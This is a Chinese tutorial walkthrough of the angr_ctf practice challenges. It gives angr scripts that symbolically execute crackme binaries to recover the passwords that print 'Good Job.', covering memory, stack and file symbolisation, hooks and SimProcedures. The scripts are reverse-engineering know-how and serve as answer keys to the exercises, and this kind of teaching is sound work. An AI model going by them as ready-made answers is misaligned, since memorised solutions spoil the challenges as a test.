<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">maybe_good</span><span class="params">(<span class="type">char</span> *s1, <span class="type">char</span> *s2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( should_succeed &amp;&amp; !<span class="built_in">strncmp</span>(s1, s2, <span class="number">8u</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>添加avoid</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;dist/01_angr_avoid&#x27;</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x80485E0</span>, avoid=<span class="number">0x80485A8</span>)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p><strong>angr_find_condition</strong></p>
<p>因为有很多重复代码块，所以这题也有很多可能会输出”Good Job.”的地址，这时候我们像<code>00_angr_find</code>那样设定一个单一的目标地址就不太可能了。不过幸好，explore函数的find参数除了地址外，也可以是一个携带SimState参数的函数，代码如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_successful</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">should_avoid</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;dist/02_angr_find_condition&#x27;</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=is_successful, avoid=should_avoid)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<h4 id="symbolic"><a href="#symbolic" class="headerlink" title="symbolic"></a>symbolic</h4><p>angr在默认情况下只会符号化从标准输入流中读取的数据，而实际情况往往需要我们符号化其他数据，如寄存器、某块内存甚至是某个文件。</p>
<p><strong>angr_symbolic_registers</strong></p>
<p>用之前的方法也能跑出答案,</p>
<p>从用户读取的三个数字被保存到了eax,ebx,edx中</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/03_angr_symbolic_registers&#x27;</span>)</span><br><span class="line">state = proj.factory.blank_state(addr=<span class="number">0x8048980</span>)</span><br><span class="line">password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">password2 = claripy.BVS(<span class="string">&#x27;password2&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">state.regs.eax = password0</span><br><span class="line">state.regs.ebx = password1</span><br><span class="line">state.regs.edx = password2</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x80489E6</span>)</span><br><span class="line">solver = simgr.found[<span class="number">0</span>].solver</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password0: <span class="subst">&#123;<span class="built_in">hex</span>(solver.<span class="built_in">eval</span>(password0))&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password1: <span class="subst">&#123;<span class="built_in">hex</span>(solver.<span class="built_in">eval</span>(password1))&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password2: <span class="subst">&#123;<span class="built_in">hex</span>(solver.<span class="built_in">eval</span>(password2))&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>注意这里的初始state是通过blank_state函数而不是entry_state函数获得的：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">state = proj.factory.blank_state(addr=<span class="number">0x8048980</span>)</span><br></pre></td></tr></table></figure>
<p>因为在0x8048980之前的指令对我们的求解其实是没有任何作用的，包括get_user_input函数，因为接下来我们就要将get_user_input函数的结果符号化了，而不是让angr自动帮我们符号化通过scanf读取的数据</p>
<p><strong>angr_symbolic_stack</strong></p>
<p>对栈空间内的数据进行符号化</p>
<p>这题将scanf读取的数据保存在栈上，并且通过ebp索引这些符号值（比如<code>[ebp+var_C]</code>），所以我们得让ebp有一个正确的初值了。之所以说是正确的初值，是因为我们跳过了函数开头对栈的调整，因此我们还需要手动调整ebp的值</p>
<p>ebp的值是什么不重要，我们只需要保证它和esp的偏移是正确的即可，对前面的汇编指令进行分析我们可以得出此时ebp的偏移量为：0x18+4+4+4+4=40</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">state.regs.ebp = state.regs.esp + <span class="number">40</span></span><br></pre></td></tr></table></figure>
<p>然后对esp的值执行调整，使我们接下来push进去的符号值恰好在[ebp+var_10]和[ebp+var_C]这两个位置，记得push完之后要把esp调回来</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/04_angr_symbolic_stack&#x27;</span>)</span><br><span class="line">state = proj.factory.blank_state(addr=<span class="number">0x8048694</span>)</span><br><span class="line">state.regs.ebp = state.regs.esp + <span class="number">40</span></span><br><span class="line">state.regs.esp = state.regs.ebp - <span class="number">0xC</span> + <span class="number">4</span></span><br><span class="line">password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">state.stack_push(password0)</span><br><span class="line">state.stack_push(password1)</span><br><span class="line">state.regs.esp = state.regs.ebp - <span class="number">40</span></span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x80486E1</span>)</span><br><span class="line">solver = simgr.found[<span class="number">0</span>].solver</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password0: <span class="subst">&#123;<span class="built_in">hex</span>(solver.<span class="built_in">eval</span>(password0))&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password1: <span class="subst">&#123;<span class="built_in">hex</span>(solver.<span class="built_in">eval</span>(password1))&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>angr_symbolic_memory</strong></p>
<p>用户输入被保存在全局变量中</p>
<p>完整代码如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/05_angr_symbolic_memory&#x27;</span>)</span><br><span class="line">state = proj.factory.blank_state(addr=<span class="number">0x80485FE</span>)</span><br><span class="line">password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">password2 = claripy.BVS(<span class="string">&#x27;password2&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">password3 = claripy.BVS(<span class="string">&#x27;password3&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">state.mem[<span class="number">0xA1BA1C0</span>].uint64_t = password0</span><br><span class="line">state.mem[<span class="number">0xA1BA1C0</span> + <span class="number">8</span>].uint64_t = password1</span><br><span class="line">state.mem[<span class="number">0xA1BA1C0</span> + <span class="number">16</span>].uint64_t = password2</span><br><span class="line">state.mem[<span class="number">0xA1BA1C0</span> + <span class="number">24</span>].uint64_t = password3</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x804866A</span>)</span><br><span class="line">solver = simgr.found[<span class="number">0</span>].solver</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password0: <span class="subst">&#123;solver.<span class="built_in">eval</span>(password0, cast_to=<span class="built_in">bytes</span>)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password1: <span class="subst">&#123;solver.<span class="built_in">eval</span>(password1, cast_to=<span class="built_in">bytes</span>)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password2: <span class="subst">&#123;solver.<span class="built_in">eval</span>(password2, cast_to=<span class="built_in">bytes</span>)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password3: <span class="subst">&#123;solver.<span class="built_in">eval</span>(password3, cast_to=<span class="built_in">bytes</span>)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>如果我们要获取内存中的数据（具体值或者符号值），可以这样用：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.mem[<span class="number">0xA1BA1C0</span>].uint64_t.resolved</span><br><span class="line">&lt;BV64 password0_0_64&gt;</span><br></pre></td></tr></table></figure>
<p><strong>angr_symbolic_dynamic_memory</strong></p>
<p>这题使用了malloc函数来动态分配内存，因此输入的地址就不是固定的</p>
<p>但我们仍然可以在内存中选定一块区域作为输入的地址，比如说在.bss段选定一块未使用的16字节区域，然后对输入进行符号化</p>
<p>并将缓冲区的地址设成我们刚刚选定的地址,这样做完全可行,是因为我们初始化的state已经跳过了malloc</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/06_angr_symbolic_dynamic_memory&#x27;</span>)</span><br><span class="line">state = proj.factory.blank_state(addr=<span class="number">0x8048696</span>)</span><br><span class="line">password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">state.mem[<span class="number">0xABCC700</span>].uint64_t = password0</span><br><span class="line">state.mem[<span class="number">0xABCC700</span> + <span class="number">8</span>].uint64_t = password1</span><br><span class="line">state.mem[<span class="number">0xABCC8A4</span>].uint32_t = <span class="number">0xABCC700</span></span><br><span class="line">state.mem[<span class="number">0xABCC8AC</span>].uint32_t = <span class="number">0xABCC700</span> + <span class="number">8</span></span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x8048759</span>)</span><br><span class="line">solver = simgr.found[<span class="number">0</span>].solver</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password0: <span class="subst">&#123;solver.<span class="built_in">eval</span>(password0, cast_to=<span class="built_in">bytes</span>)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password1: <span class="subst">&#123;solver.<span class="built_in">eval</span>(password1, cast_to=<span class="built_in">bytes</span>)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>angr_symbolic_file</strong></p>
<p>这题是先把输入写进文件，再从文件中读取输入</p>
<p>在这题中我们要忽略scanf，直接对文件的内容进行符号化。要对文件内容进行符号化，首先我们要创建一个模拟的文件<code>SimFile</code>，文件名为’OJKSQYDP.txt’，内容为8字节的符号值，大小为0x40字节：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">sim_file = angr.SimFile(name=<span class="string">&#x27;OJKSQYDP.txt&#x27;</span>, content=password0, size=<span class="number">0x40</span>)</span><br></pre></td></tr></table></figure>
<p>然后插入到state的文件系统（FileSystem）中，state的文件系统可以通过state.fs获得：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">state.fs.insert(<span class="string">&#x27;OJKSQYDP.txt&#x27;</span>, sim_file)</span><br></pre></td></tr></table></figure>
<p>完整代码：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/07_angr_symbolic_file&#x27;</span>)</span><br><span class="line">state = proj.factory.blank_state(addr=<span class="number">0x80488D3</span>)</span><br><span class="line">password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">sim_file = angr.SimFile(name=<span class="string">&#x27;OJKSQYDP.txt&#x27;</span>, content=password0, size=<span class="number">0x40</span>)</span><br><span class="line">state.fs.insert(<span class="string">&#x27;OJKSQYDP.txt&#x27;</span>, sim_file)</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x80489AD</span>)</span><br><span class="line">solver = simgr.found[<span class="number">0</span>].solver</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;password0: <span class="subst">&#123;solver.<span class="built_in">eval</span>(password0, cast_to=<span class="built_in">bytes</span>)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="constraints"><a href="#constraints" class="headerlink" title="constraints"></a>constraints</h4><p>angr在符号执行的过程中，会将路径约束保存在SimState内置的约束求解器内。</p>
<p>这题的流程是先对输入加密，然后调用check_equals_xxx函数对加密后的输入进行比较，若比对成功则输出”Good Job.”</p>
<p>check_equals_AUPDNNPROEZRJWKB函数会将输入与”AUPDNNPROEZRJWKB”进行比较</p>
<p>这题直接调用explore是跑不出来的，因为在check_equals函数中不是比对失败就立刻退出循环，而是一直循环到最后。总共有16轮循环，每次循环会产生比对成功和比对失败两个状态，所以符号执行总共会产生216个状态，导致<em>路径爆炸</em>：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/08_angr_constraints&#x27;</span>)</span><br><span class="line">state = proj.factory.blank_state(addr=<span class="number">0x8048622</span>)</span><br><span class="line">password = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, <span class="number">16</span> * <span class="number">8</span>)</span><br><span class="line">buffer_addr = <span class="number">0x804A050</span></span><br><span class="line">state.memory.store(buffer_addr, password)</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x8048669</span>)<span class="comment"># 执行check_equals_AUPDNNPROEZRJWKB函数之前</span></span><br><span class="line">found = simgr.found[<span class="number">0</span>]</span><br><span class="line">found.add_constraints(found.memory.load(buffer_addr, <span class="number">16</span>) == <span class="string">b&#x27;AUPDNNPROEZRJWKB&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(found.solver.<span class="built_in">eval</span>(password, cast_to=<span class="built_in">bytes</span>))</span><br></pre></td></tr></table></figure>
<h4 id="hooks"><a href="#hooks" class="headerlink" title="hooks"></a>hooks</h4><p><strong>angr_hooks</strong></p>
<p>与上题不同的是，这题的比较函数不在整个加密流程的最后，所以我们不能再采用上题手动添加约束并求解的方法</p>
<p>既然check_equals函数本身的流程非常简单，那么我们就可以用hook技术将check_equals函数替换为一个<strong>等效的并且不会导致路径爆炸的函数</strong>，然后再进行符号执行</p>
<p>注意这里的hook是对call指令进行了hook，而不是函数本身，length指的是跳过的字节数，call指令占5个字节，所以length=5：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/09_angr_hooks&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@proj.hook(<span class="params">addr=<span class="number">0x80486B3</span>, length=<span class="number">5</span></span>)  </span><span class="comment"># check_equals_XYMKBKUHNIQYNQXE</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_check_equals</span>(<span class="params">state</span>):</span><br><span class="line">    buffer_addr = <span class="number">0x804A054</span></span><br><span class="line">    buffer = state.memory.load(buffer_addr, <span class="number">16</span>)</span><br><span class="line">    state.regs.eax = claripy.If(buffer == <span class="string">b&#x27;XYMKBKUHNIQYNQXE&#x27;</span>, claripy.BVV(<span class="number">1</span>, <span class="number">32</span>), claripy.BVV(<span class="number">0</span>, <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(</span><br><span class="line">    find=<span class="keyword">lambda</span> state : <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>),</span><br><span class="line">    avoid=<span class="keyword">lambda</span> state: <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p><strong>angr_simprocedures</strong></p>
<p>现在我们没法hook所有掉call指令了，因为call指令实在是太多了</p>
<p>接下来我们就要引入一种对函数本身进行hook的方法——SimProcedures，定义一个SimProcedures的代码如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyCheckEquals</span>(angr.SimProcedure):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, buffer_addr, length</span>):</span><br><span class="line">        buffer = self.state.memory.load(buffer_addr, length)</span><br><span class="line">        <span class="keyword">return</span> claripy.If(buffer == <span class="string">b&#x27;ORSDDWXHZURJRBDH&#x27;</span>, claripy.BVV(<span class="number">1</span>, <span class="number">32</span>), claripy.BVV(<span class="number">0</span>, <span class="number">32</span>))</span><br></pre></td></tr></table></figure>
<p>SimProcedure按字面意思来理解就是“模拟程序”，在这里我们用一个SimProcedure的子类MyCheckEquals模拟了check_equals_ORSDDWXHZURJRBDH函数的功能，SimProcedure中的run函数由子类实现，其接收的参数与C语言中的参数保持一致，返回为对应原函数的返回值。</p>
<p>定义好了SimProcedure之后，我们需要调用hook_symbol函数对程序中名为check_equals_ORSDDWXHZURJRBDH的函数进行hook：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proj.hook_symbol(symbol_name=<span class="string">&#x27;check_equals_ORSDDWXHZURJRBDH&#x27;</span>, simproc=MyCheckEquals())</span><br></pre></td></tr></table></figure>
<p>hook之后angr在符号执行的过程中将不会调用原先的check_equals_ORSDDWXHZURJRBDH函数，而是MyCheckEquals类中的run函数。然后我们就可以用老方法解决这道题了，完整代码：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyCheckEquals</span>(angr.SimProcedure):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, buffer_addr, length</span>):</span><br><span class="line">        buffer = self.state.memory.load(buffer_addr, length)</span><br><span class="line">        <span class="keyword">return</span> claripy.If(buffer == <span class="string">b&#x27;ORSDDWXHZURJRBDH&#x27;</span>, claripy.BVV(<span class="number">1</span>, <span class="number">32</span>), claripy.BVV(<span class="number">0</span>, <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/10_angr_simprocedures&#x27;</span>)</span><br><span class="line">proj.hook_symbol(symbol_name=<span class="string">&#x27;check_equals_ORSDDWXHZURJRBDH&#x27;</span>, simproc=MyCheckEquals())</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(</span><br><span class="line">    find=<span class="keyword">lambda</span> state : <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>),</span><br><span class="line">    avoid=<span class="keyword">lambda</span> state: <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p><strong>angr_sim_scanf</strong></p>
<p>angr_ctf给的说法是<strong>angr不支持多个参数的scanf</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># This time, the solution involves simply replacing scanf with our own version,</span><br><span class="line"># since Angr does not support requesting multiple parameters with scanf.</span><br></pre></td></tr></table></figure>
<p>然而实际上是可以的，可能以前的版本不行，毕竟angr版本迭代还是很快的：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;/dist/11_angr_sim_scanf&#x27;</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(</span><br><span class="line">    find=<span class="keyword">lambda</span> state : <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>),</span><br><span class="line">    avoid=<span class="keyword">lambda</span> state: <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;1448564819 1398294103&#x27;</span></span><br></pre></td></tr></table></figure>
<p>angr在angr/procedures中定义了很多模拟系统函数的SimProcedures：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/angr/angr/tree/master/angr/procedures">angr/angr/procedures at master · angr/angr (github.com)</a></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/11_angr_sim_scanf&#x27;</span>)</span><br><span class="line">proj.hook_symbol(<span class="string">&quot;__isoc99_scanf&quot;</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;scanf&#x27;</span>]())  <span class="comment">#</span></span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(</span><br><span class="line">    find=<span class="keyword">lambda</span> state : <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>),</span><br><span class="line">    avoid=<span class="keyword">lambda</span> state: <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<h4 id="veritesting"><a href="#veritesting" class="headerlink" title="veritesting"></a>veritesting</h4><p>缓解路径爆炸的第三种方法——Veritesting</p>
<p>angr中实现了上述论文中提到的Veritesting技术，我们只需要在构建simgr的时候添加一个<code>veritesting=True</code>参数即可，代码如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simgr = proj.factory.simgr(state, veritesting=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>跑出来还是要花一点时间</p>
